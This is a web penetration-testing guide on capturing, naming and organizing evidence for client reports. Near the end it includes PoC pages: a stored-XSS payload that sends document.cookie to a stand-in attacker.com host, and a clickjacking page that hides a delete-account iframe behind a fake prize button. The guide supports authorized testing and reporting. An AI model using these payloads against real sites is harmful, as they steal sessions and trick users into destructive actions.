# Web Application Evidence Collection Guide

Systematic approach to capturing, organizing, and documenting evidence during web application penetration testing. Proper evidence collection is critical for report writing and demonstrating impact to stakeholders.

Related: [[WEB-02-Technical-Testing-Checklist]] | [[WEB-03-Request-Tracker]] | [[WEB-05-Reporting-Template]]

---

## Evidence Collection Principles

### Why Evidence Matters
- **Proof of concept** - Demonstrates vulnerability exists
- **Reproducibility** - Allows client to verify and fix
- **Legal protection** - Documents authorized testing
- **Report quality** - Visual evidence > walls of text
- **Stakeholder communication** - Executives understand screenshots

### What to Capture
- **Before state** - Normal/expected behavior
- **Attack payload** - Exact input sent
- **After state** - Exploited/abnormal behavior
- **Context** - URL, timestamp, user account
- **Impact** - What data was accessed, what action occurred

### Quality Standards
- Screenshots must be **readable** (no tiny text)
- Include **full context** (URL bar, status code visible)
- Show **complete request/response** when relevant
- Capture **error messages** verbatim
- Document **exact steps** to reproduce

---

## File Naming Convention

**Format**: `[EngagementID]_[Category]_[FindingID]_[SequenceNumber]_[Description].png`

**Examples**:
- `ACME_IDOR_F001_01_User-A-Request.png`
- `ACME_IDOR_F001_02_User-B-Data-Exposed.png`
- `ACME_SQLi_F003_01_Injection-Payload.png`
- `ACME_XSS_F005_01_Alert-Popup.png`
- `ACME_XSS_F005_02_Session-Theft-Webhook.png`

---

## Screenshot Checklist

### Every Screenshot Should Include

- [ ] **Visible URL** (full address bar)
- [ ] **HTTP method and status code** (in Burp)
- [ ] **Timestamp** (visible in screenshot or noted)
- [ ] **User context** (who's logged in)
- [ ] **Full request** (if in Burp)
- [ ] **Full response** (if in Burp)
- [ ] **Readable text** (zoom if needed)

---

## Evidence Categories

### Discovery & Reconnaissance

**Purpose**: Document attack surface and interesting findings

**Captures**:
- [ ] Directory/file enumeration results
- [ ] Exposed files (.git, .env, backup files)
- [ ] Admin panels discovered
- [ ] Technology fingerprinting
- [ ] Robots.txt, sitemap.xml
- [ ] API endpoints discovered

**Naming**: `[Engagement]_Discovery_[Sequence]_[Description].png`

**Example**:
```
ACME_Discovery_01_Git-Repo-Exposed.png
ACME_Discovery_02_Admin-Panel-Found.png
ACME_Discovery_03_Database-Backup-Download.png
```

---

### Authentication Testing

**Purpose**: Document authentication weaknesses

**Captures**:
- [ ] **Username enumeration**: Different error messages or timing
- [ ] **Weak password**: Accepted password
- [ ] **Predictable reset tokens**: Token structure
- [ ] **Default credentials**: Successful login
- [ ] **Brute force success**: Cracked credentials

**Critical Details**:
- Show timing differences (use timestamps)
- Show different error messages side-by-side
- Capture full password reset flow
- Document token format

**Naming**: `[Engagement]_Auth_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_Auth_F001_01_Valid-User-Response.png
ACME_Auth_F001_02_Invalid-User-Response.png
ACME_Auth_F001_03_Timing-Difference.png
ACME_Auth_F002_01_Reset-Token-Structure.png
```

---

### IDOR/Authorization Bypass

**Purpose**: Show unauthorized access to other users' data

**Captures**:
- [ ] **User A context**: Show who you're logged in as
- [ ] **Request**: Show ID parameter being changed
- [ ] **Response**: Show unauthorized data returned
- [ ] **Impact**: Highlight sensitive data exposed

**Critical Details**:
- Clearly show User A's session/token
- Clearly show User B's ID in request
- Highlight PII/sensitive data in response
- Use Burp to show full request/response

**Naming**: `[Engagement]_IDOR_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_IDOR_F001_01_User-A-Session.png
ACME_IDOR_F001_02_Request-User-B-ID.png
ACME_IDOR_F001_03_User-B-Data-Exposed.png
ACME_IDOR_F001_04_Burp-Full-Request.png
```

---

### SQL Injection

**Purpose**: Document SQL injection and data extraction

**Captures**:
- [ ] **Detection**: Error message or boolean response
- [ ] **Column enumeration**: ORDER BY results
- [ ] **Union injection**: Finding injectable columns
- [ ] **Data extraction**: Database name, tables, data
- [ ] **SQLMap output**: Automated exploitation results

**Critical Details**:
- Show exact payload with encoding
- Capture database error messages (full text)
- Show extracted data (redact if real PII)
- Document SQL injection type (error-based, union, blind)

**Naming**: `[Engagement]_SQLi_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_SQLi_F003_01_Error-Based-Detection.png
ACME_SQLi_F003_02_Union-Select-Success.png
ACME_SQLi_F003_03_Database-Version.png
ACME_SQLi_F003_04_Table-Names-Extracted.png
ACME_SQLi_F003_05_User-Data-Extracted-REDACTED.png
ACME_SQLi_F003_06_SQLMap-Output.png
```

---

### Cross-Site Scripting (XSS)

**Purpose**: Demonstrate XSS and potential impact

**Captures**:
- [ ] **Payload injection**: Where XSS was injected
- [ ] **Alert popup**: Proof of execution
- [ ] **Cookie theft**: Webhook receiving session
- [ ] **DOM context**: Source code showing unsafe sink
- [ ] **Stored XSS**: Persistence after reload

**Critical Details**:
- Show payload in input field
- Show alert dialog (or other execution proof)
- For stored XSS: show it executes on reload
- For session theft: show attacker's server receiving cookie
- Include URL in screenshot

**Naming**: `[Engagement]_XSS_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_XSS_F005_01_Payload-Injection.png
ACME_XSS_F005_02_Alert-Popup.png
ACME_XSS_F005_03_Session-Cookie-Displayed.png
ACME_XSS_F005_04_Webhook-Received-Cookie.png
ACME_XSS_F005_05_Source-Code-Unsafe-Sink.png
```

**For stored XSS**:
```
ACME_XSS_F006_01_Comment-Submission.png
ACME_XSS_F006_02_Page-Reload.png
ACME_XSS_F006_03_XSS-Executes-Again.png
```

---

### File Upload Vulnerabilities

**Purpose**: Document file upload bypass and execution

**Captures**:
- [ ] **File contents**: Show malicious file code
- [ ] **Upload request**: Burp showing bypass technique
- [ ] **Upload response**: Confirmation and file path
- [ ] **Execution proof**: Accessing uploaded file
- [ ] **Command execution**: Web shell output

**Critical Details**:
- Show file contents before upload
- Document bypass technique (double extension, null byte, etc.)
- Show file path in response or error
- Demonstrate execution (web shell command output)

**Naming**: `[Engagement]_FileUpload_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_FileUpload_F007_01_Shell-Contents.png
ACME_FileUpload_F007_02_Upload-Request-Burp.png
ACME_FileUpload_F007_03_Upload-Success.png
ACME_FileUpload_F007_04_Shell-Access.png
ACME_FileUpload_F007_05_Whoami-Command.png
```

---

### Business Logic Flaws

**Purpose**: Demonstrate financial or workflow impact

**Captures**:
- [ ] **Before state**: Original price/balance/status
- [ ] **Exploit request**: Modified parameters
- [ ] **After state**: Manipulated price/balance/status
- [ ] **Proof of impact**: Order confirmation, receipt

**Critical Details**:
- Clear before/after comparison
- Dollar amounts visible
- Transaction IDs shown
- Timestamps for sequence proof

**Naming**: `[Engagement]_BizLogic_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_BizLogic_F008_01_Cart-Total-$500.png
ACME_BizLogic_F008_02_Modified-Price-Request.png
ACME_BizLogic_F008_03_Cart-Total-$1.png
ACME_BizLogic_F008_04_Order-Confirmation.png
```

**For race conditions**:
```
ACME_BizLogic_F009_01_Initial-Balance-$100.png
ACME_BizLogic_F009_02_Turbo-Intruder-Config.png
ACME_BizLogic_F009_03_Simultaneous-Requests.png
ACME_BizLogic_F009_04_Final-Balance-Negative.png
```

---

### Session Management

**Purpose**: Document session security issues

**Captures**:
- [ ] **Cookie inspection**: Flags and attributes
- [ ] **Session fixation**: Same session before/after login
- [ ] **Token predictability**: Burp Sequencer results
- [ ] **Logout testing**: Token still valid after logout

**Critical Details**:
- Show cookie in browser dev tools
- Highlight missing security flags
- Show token reuse after logout
- Document session lifetime

**Naming**: `[Engagement]_Session_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_Session_F010_01_Cookie-Missing-HttpOnly.png
ACME_Session_F010_02_Session-Before-Login.png
ACME_Session_F010_03_Session-After-Login-Same.png
ACME_Session_F010_04_Logout-Click.png
ACME_Session_F010_05_Old-Session-Still-Valid.png
```

---

### Command Injection

**Purpose**: Prove command execution

**Captures**:
- [ ] **Injection payload**: Command in request
- [ ] **Command output**: Response showing execution
- [ ] **Advanced exploitation**: Reverse shell or file read

**Critical Details**:
- Show exact payload with special characters
- Capture command output in response
- Demonstrate severity (file read, shell access)

**Naming**: `[Engagement]_CmdInject_F[###]_[Sequence]_[Description].png`

**Example**:
```
ACME_CmdInject_F011_01_Whoami-Payload.png
ACME_CmdInject_F011_02_Command-Output.png
ACME_CmdInject_F011_03_Etc-Passwd-Read.png
```

---

## Burp Suite Evidence

### What to Export from Burp

- [ ] **Full project file** (`.burp`)
- [ ] **Request/response for each finding**
- [ ] **Site map** showing scope
- [ ] **Proxy history** (filtered to target)
- [ ] **Scanner results** (if used)
- [ ] **Intruder results** (for fuzzing/brute force)
- [ ] **Sequencer results** (for token analysis)

### Burp Screenshots

**Essential captures**:
- [ ] **Request tab**: Full request with headers
- [ ] **Response tab**: Full response
- [ ] **Params tab**: Parameter modifications
- [ ] **Headers tab**: Request/response headers
- [ ] **Repeater**: PoC reproducibility

**Naming**: `[Engagement]_Burp_F[###]_[ReqResp]_[Description].png`

**Example**:
```
ACME_Burp_F001_Request_IDOR.png
ACME_Burp_F001_Response_Unauthorized-Data.png
ACME_Burp_F003_Request_SQLi-Union.png
ACME_Burp_F003_Response_Database-Extracted.png
```

---

## Video Evidence

### When to Record Video

Use screen recording for:
- [ ] Complex multi-step exploits
- [ ] Real-time attacks (race conditions)
- [ ] XSS demonstrations (alert, cookie theft)
- [ ] File upload to execution flow
- [ ] Command injection to reverse shell

### Recording Best Practices

- **Short and focused** (2-5 min max per finding)
- **Narrate or add captions** explaining what you're doing
- **Show timestamps** clearly
- **Edit out waiting/typos**
- **Export as MP4** (universal compatibility)

**Naming**: `[Engagement]_Video_F[###]_[Description].mp4`

**Example**:
```
ACME_Video_F007_File-Upload-To-Shell.mp4
ACME_Video_F009_Race-Condition-Exploit.mp4
```

---

## Evidence Organization

### Directory Structure

```
[Engagement-Name]-Evidence/
├── 01-Discovery/
│   ├── ACME_Discovery_01_Admin-Panel.png
│   ├── ACME_Discovery_02_Git-Exposed.png
│   └── ACME_Discovery_03_DB-Backup.png
├── 02-Findings/
│   ├── F001-IDOR/
│   │   ├── ACME_IDOR_F001_01_Request.png
│   │   ├── ACME_IDOR_F001_02_Response.png
│   │   └── ACME_Burp_F001_Request.txt
│   ├── F002-Session-Fixation/
│   ├── F003-SQL-Injection/
│   │   ├── screenshots...
│   │   └── sqlmap_output.txt
│   ├── F005-XSS-Stored/
│   └── F007-File-Upload/
├── 03-Burp/
│   ├── ACME_WebApp_Project.burp
│   └── exported-requests/
├── 04-Videos/
│   └── ACME_Video_F007_Shell-Upload.mp4
├── 05-Scripts/
│   ├── idor_test.py
│   └── xss_payloads.txt
└── 06-Notes/
    ├── WEB-03-Request-Tracker.md
    └── testing-notes.txt
```

---

## Evidence Tracking Table

| Finding ID | Finding Name | Evidence Type | Filename(s) | Date Captured | RT Reference |
|-----------|-------------|--------------|-------------|---------------|-------------|
| F001 | IDOR - User Profiles | Screenshots (3) | ACME_IDOR_F001_*.png | 2026-01-22 | RT-201 |
| F001 | IDOR - User Profiles | Burp Export | ACME_Burp_F001_*.txt | 2026-01-22 | RT-201 |
| F003 | SQL Injection | Screenshots (6) | ACME_SQLi_F003_*.png | 2026-01-22 | RT-401 |
| F003 | SQL Injection | SQLMap Output | sqlmap_output.txt | 2026-01-22 | RT-401 |
| F005 | Stored XSS | Screenshots (3) | ACME_XSS_F005_*.png | 2026-01-22 | RT-502 |
| F007 | File Upload RCE | Screenshots (5) + Video | ACME_FileUpload_F007_* | 2026-01-22 | RT-602 |
| | | | | | |

---

## PoC Scripts & HTML Files

### XSS PoC Page

Create HTML file to demonstrate XSS:

**File**: `ACME_F005_XSS_PoC.html`
```html
<!DOCTYPE html>
<html>
<head>
  <title>XSS PoC - ACME Corp</title>
</head>
<body>
  <h1>Cross-Site Scripting Proof of Concept</h1>
  <p>This page demonstrates stored XSS in comment field.</p>
  
  <h2>Vulnerable URL:</h2>
  <p>https://target.com/post/123</p>
  
  <h2>Payload Used:</h2>
  <pre>&lt;img src=x onerror="fetch('https://attacker.com/steal',{method:'POST',body:document.cookie})"&gt;</pre>
  
  <h2>Impact:</h2>
  <p>All users viewing this post will have their session cookie sent to attacker-controlled server.</p>
  
  <h2>Steps to Reproduce:</h2>
  <ol>
    <li>Navigate to https://target.com/post/123</li>
    <li>Submit comment with payload above</li>
    <li>View post as different user</li>
    <li>Cookie is sent to attacker webhook</li>
  </ol>
</body>
</html>
```

### Clickjacking PoC

**File**: `ACME_F012_Clickjacking_PoC.html`
```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    iframe {
      opacity: 0.1; /* Make semi-transparent for demo */
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 2;
    }
    button {
      position: absolute;
      top: 200px;
      left: 300px;
      z-index: 1;
      padding: 20px 40px;
      font-size: 20px;
    }
  </style>
</head>
<body>
  <h1>Click for Free iPhone!</h1>
  <button>CLAIM NOW</button>
  <iframe src="https://target.com/delete-account"></iframe>
  
  <p style="position: absolute; top: 400px;">
    Note: In real attack, iframe opacity would be 0 (invisible).<br>
    User thinks they're clicking "CLAIM NOW" but actually clicking "Delete Account" button on hidden iframe.
  </p>
</body>
</html>
```

---

## Evidence Quality Checklist

Before finalizing evidence collection:

### Completeness
- [ ] Every finding has 2-3 screenshots minimum
- [ ] Critical findings have Burp exports
- [ ] Critical findings have video (if applicable)
- [ ] PoC HTML files created for XSS/Clickjacking
- [ ] All evidence named consistently
- [ ] Directory structure organized

### Quality
- [ ] All text is readable (adequate zoom)
- [ ] Context is clear (URLs, user context visible)
- [ ] Before/after states captured for comparisons
- [ ] No extraneous desktop clutter
- [ ] Sensitive data redacted appropriately (test data preferred)

### Documentation
- [ ] Evidence tracking table populated
- [ ] Each file referenced in [[WEB-03-Request-Tracker]]
- [ ] Findings mapped to evidence in [[WEB-05-Reporting-Template]]
- [ ] Testing timeline documented
- [ ] Burp project saved and named correctly

---

## Tools for Evidence Collection

### Screenshot Tools
- **Windows**: Snipping Tool, ShareX, Greenshot
- **Linux**: Flameshot, Spectacle
- **macOS**: Cmd+Shift+4
- **Browser**: Built-in screenshot (F12 â†' ...) 

### Screen Recording
- **Windows**: OBS Studio, ShareX
- **Linux**: OBS Studio, SimpleScreenRecorder
- **macOS**: QuickTime, OBS Studio

### Burp Extensions
- **Logger++**: Enhanced logging
- **Copy as cURL**: Export reproducible commands
- **Autorize**: Authorization testing
- **Param Miner**: Parameter discovery

---

## Tips for High-Quality Evidence

### Do
✅ Capture full browser window with URL bar
✅ Use high resolution (text must be readable)
✅ Number sequences for multi-step attacks
✅ Annotate screenshots to highlight key details
✅ Test reproducibility before finalizing
✅ Keep raw and annotated versions

### Don't
❌ Crop out URLs or important context
❌ Use low-quality compression
❌ Mix evidence from different findings
❌ Forget to save Burp project
❌ Leave real PII/credentials unredacted
❌ Assume you'll remember context later (document NOW)

---

## Evidence Handoff Checklist

Before delivering evidence to client:

- [ ] All evidence organized per directory structure
- [ ] Sensitive data redacted (or test data used)
- [ ] Evidence tracking table complete
- [ ] Burp project file included
- [ ] PoC HTML files included
- [ ] README.txt with instructions
- [ ] Evidence package encrypted (7z with password)
- [ ] Password delivered via separate channel
- [ ] Client confirms receipt

---

## Tags
#evidence #screenshots #documentation #web-testing #burp

---

## Related Documents
- [[WEB-00-Overview|Overview]]
- [[WEB-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[WEB-03-Request-Tracker|Request Tracker]]
- [[WEB-05-Reporting-Template|Reporting Template]]

---
*Created: 2026-01-22*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
